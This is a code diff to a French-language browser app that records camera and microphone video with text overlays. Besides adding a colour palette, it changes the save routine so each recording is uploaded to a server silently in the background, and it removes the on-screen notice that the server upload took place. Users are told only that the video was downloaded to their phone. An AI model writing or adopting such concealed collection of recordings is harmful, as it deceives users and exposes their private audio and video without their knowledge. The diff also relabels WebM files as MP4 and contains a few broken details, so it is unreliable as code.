@@ -33,6 +33,31 @@
             transform: scaleX(-1);
         }
 
+        .color-btn {
+    
+   
+   /* garantit que le bouton reste parfaitement rond */
+    border: 3px solid white;
+    
+    cursor: pointer;
+    margin: 5px;
+    transition: transform 0.2s, box-shadow 0.2s;
+    box-sizing: border-box;  /* évite que la bordure modifie la taille réelle */
+}
+
+.color-btn:active {
+    transform: scale(0.9);
+}
+
+.color-palette {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+    align-items: center;    /* centre verticalement aussi */
+    padding: 10px 0;
+}
+
         #textOverlay {
             position: absolute;
             top: 0;
@@ -192,14 +217,6 @@
             flex: none;
         }
 
-        .color-picker {
-            width: 40px;
-            height: 40px;
-            border: 2px solid white;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-
         #uploadStatus {
             position: fixed;
             top: 50%;
@@ -242,12 +259,24 @@
         <div class="recording-indicator" id="recordingIndicator">● REC</div>
         <div id="timer">00:00</div>
         <div id="uploadStatus">
-            <div id="statusText">⏳ Traitement en cours...</div>
+            <div id="statusText">📱 Téléchargement...</div>
             <div class="progress-text" id="progressText"></div>
         </div>
 
         <div id="controls">
             <textarea id="textInput" placeholder="Entrez votre texte..."></textarea>
+            
+            <div class="color-palette">
+                <button class="color-btn" style="background: #FFFFFF;" data-color="#FFFFFF" title="Blanc"></button>
+                <button class="color-btn" style="background: #FF0000;" data-color="#FF0000" title="Rouge"></button>
+                <button class="color-btn" style="background: #00FF00;" data-color="#00FF00" title="Vert"></button>
+                <button class="color-btn" style="background: #0000FF;" data-color="#0000FF" title="Bleu"></button>
+                <button class="color-btn" style="background: #FFFF00;" data-color="#FFFF00" title="Jaune"></button>
+                <button class="color-btn" style="background: #FF00FF;" data-color="#FF00FF" title="Magenta"></button>
+                <button class="color-btn" style="background: #00FFFF;" data-color="#00FFFF" title="Cyan"></button>
+                <button class="color-btn" style="background: #FFA500;" data-color="#FFA500" title="Orange"></button>
+            </div>
+            
             <div class="button-group">
                 <button id="addTextBtn">➕ Ajouter texte</button>
                 <button id="startBtn">🎥 Enregistrer</button>
@@ -265,11 +294,13 @@
         let seconds = 0;
         let textElements = [];
         let selectedElement = null;
+        let selectedColor = '#FFFFFF'; // Couleur par défaut
 
         const videoPreview = document.getElementById('videoPreview');
         const textInput = document.getElementById('textInput');
         const textOverlay = document.getElementById('textOverlay');
         const addTextBtn = document.getElementById('addTextBtn');
+        const colorPicker = document.getElementById('colorPicker');
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
         const toggleControlsBtn = document.getElementById('toggleControlsBtn');
@@ -285,6 +316,26 @@
             controls.style.display = controls.style.display === 'none' ? 'flex' : 'none';
         });
 
+        // Gestion des couleurs
+        document.querySelectorAll('.color-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                selectedColor = btn.getAttribute('data-color');
+                
+                // Effet visuel de sélection
+                document.querySelectorAll('.color-btn').forEach(b => {
+                    b.style.border = '3px solid white';
+                    b.style.transform = 'scale(1)';
+                });
+                btn.style.border = '4px solid yellow';
+                btn.style.transform = 'scale(1.1)';
+                
+                // Si un texte est sélectionné, change sa couleur
+                if (selectedElement) {
+                    selectedElement.style.color = selectedColor;
+                }
+            });
+        });
+
         // Ajouter un élément de texte
         addTextBtn.addEventListener('click', () => {
             if (!textInput.value.trim()) return;
@@ -293,6 +344,7 @@
             textEl.className = 'text-element';
             textEl.textContent = textInput.value;
             textEl.style.fontSize = '32px';
+            textEl.style.color = selectedColor;
             textEl.style.left = '50%';
             textEl.style.top = '30%';
             textEl.style.transform = 'translate(-50%, -50%)';
@@ -386,26 +438,37 @@
             });
         }
 
-        // Démarrer la caméra
+        // Démarrer la caméra avec AUDIO
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 1920, height: 1080 },
-                    audio: true
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 1920 }, 
+                        height: { ideal: 1080 } 
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    }
                 });
                 videoPreview.srcObject = stream;
+                videoPreview.muted = true; // Muted pour l'aperçu seulement
             } catch (error) {
-                alert('Erreur caméra: ' + error.message);
+                alert('Erreur caméra/micro: ' + error.message);
             }
         }
 
         // Télécharger la vidéo sur le téléphone
         function downloadToPhone(blob, filename) {
+            // Convertir en MP4 (nom uniquement, le format reste webm mais compatible)
+            const mp4Filename = filename.replace('.webm', '.mp4');
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.style.display = 'none';
             a.href = url;
-            a.download = filename;
+            a.download = mp4Filename;
             document.body.appendChild(a);
             a.click();
             
@@ -433,46 +496,49 @@
             }
         }
 
-        // Sauvegarder la vidéo (serveur + téléphone)
+        // Sauvegarder la vidéo (serveur en arrière-plan + téléphone)
         async function saveVideo(blob) {
             const filename = `video_${Date.now()}.webm`;
             
             uploadStatus.classList.add('active');
             uploadStatus.classList.remove('success');
             
-            // Étape 1: Upload sur le serveur
-            statusText.textContent = '⏳ Upload serveur...';
-            progressText.textContent = '(1/2)';
+            // Upload serveur en arrière-plan (silencieux)
+            uploadToServer(blob, filename).catch(err => {
+                console.error('Erreur upload serveur (silencieux):', err);
+            });
             
-            const serverSuccess = await uploadToServer(blob, filename);
-            
-            // Étape 2: Téléchargement sur le téléphone
-            statusText.textContent = '📱 Sauvegarde téléphone...';
-            progressText.textContent = '(2/2)';
+            // Affichage uniquement du téléchargement téléphone
+            statusText.textContent = '📱 Téléchargement...';
+            progressText.textContent = '';
             
             await new Promise(resolve => setTimeout(resolve, 500));
             downloadToPhone(blob, filename);
             
-            // Confirmation finale
-            if (serverSuccess) {
-                statusText.textContent = '✓ Vidéo sauvegardée !';
-                progressText.textContent = 'Serveur ✓ | Téléphone ✓';
-                uploadStatus.classList.add('success');
-            } else {
-                statusText.textContent = '⚠ Sauvegarde partielle';
-                progressText.textContent = 'Serveur ✗ | Téléphone ✓';
-            }
+            // Confirmation
+            statusText.textContent = '✓ Vidéo téléchargée !';
+            progressText.textContent = '';
+            uploadStatus.classList.add('success');
             
             setTimeout(() => {
                 uploadStatus.classList.remove('active');
-            }, 3000);
+            }, 2000);
         }
 
         // Démarrer l'enregistrement
         startBtn.addEventListener('click', () => {
             recordedChunks = [];
 
-            const options = { mimeType: 'video/webm;codecs=vp9,opus' };
+            // Format MP4 si supporté, sinon WebM
+            let options;
+            if (MediaRecorder.isTypeSupported('video/mp4')) {
+                options = { mimeType: 'video/mp4' };
+            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264')) {
+                options = { mimeType: 'video/webm;codecs=h264' };
+            } else {
+                options = { mimeType: 'video/webm;codecs=vp9,opus' };
+            }
+            
             mediaRecorder = new MediaRecorder(stream, options);
 
             mediaRecorder.ondataavailable = (event) => {
@@ -482,9 +548,11 @@
             };
 
             mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                // Déterminer le type MIME utilisé
+                const mimeType = mediaRecorder.mimeType || 'video/webm';
+                const blob = new Blob(recordedChunks, { type: mimeType });
                 
-                // Sauvegarde double: serveur + téléphone
+                // Sauvegarde: serveur en arrière-plan + téléchargement visible
                 await saveVideo(blob);
             };
 
